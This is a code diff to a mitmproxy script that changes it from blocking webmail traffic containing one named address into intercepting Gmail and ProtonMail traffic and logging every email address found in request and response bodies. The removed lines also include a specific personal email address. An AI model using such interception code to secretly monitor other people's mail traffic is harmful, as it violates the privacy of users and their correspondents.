@@ -3,11 +3,9 @@ import sys
 import re
 from mitmproxy import http
 
-# Domain to capture
-capture_domain = "mail.google.com"
-
-# Email address to block
-blocked_email = "shekabi827@gmail.com"
+# Domains to capture
+capture_domains = ["mail.google.com", "protonmail.com"]
+log_file = "captured_emails.log"
 
 proxy_enabled = False  # Track if proxy is enabled
 
@@ -56,31 +54,25 @@ def extract_email_ids(content):
     email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
     return re.findall(email_pattern, content)
 
-def block_email_content(content):
-    return blocked_email in extract_email_ids(content)
+def log_email(domain, email):
+    with open(log_file, 'a') as f:
+        f.write(f"{domain}: {email}\n")
 
-def block_flow(flow):
-    flow.response = http.HTTPResponse.make(
-        204,  # status code (No Content)
-        b"",  # empty content
-        {"Content-Type": "text/plain"}  # headers
-    )
+def process_flow(flow, data):
+    for domain in capture_domains:
+        if domain in flow.request.host:
+            emails = extract_email_ids(data)
+            if emails:
+                for email in emails:
+                    log_email(domain, email)
 
 def request(flow: http.HTTPFlow) -> None:
-    if capture_domain in flow.request.host:
-        request_text = flow.request.get_text(strict=False)
-        request_headers = str(flow.request.headers)
-
-        if block_email_content(request_text) or block_email_content(request_headers):
-            block_flow(flow)
+    if any(domain in flow.request.host for domain in capture_domains):
+        process_flow(flow, flow.request.get_text())
 
 def response(flow: http.HTTPFlow) -> None:
-    if capture_domain in flow.request.host:
-        response_text = flow.response.get_text(strict=False)
-        response_headers = str(flow.response.headers)
-
-        if block_email_content(response_text) or block_email_content(response_headers):
-            block_flow(flow)
+    if any(domain in flow.request.host for domain in capture_domains):
+        process_flow(flow, flow.response.get_text())
 
 def main():
     print("Starting Server...")
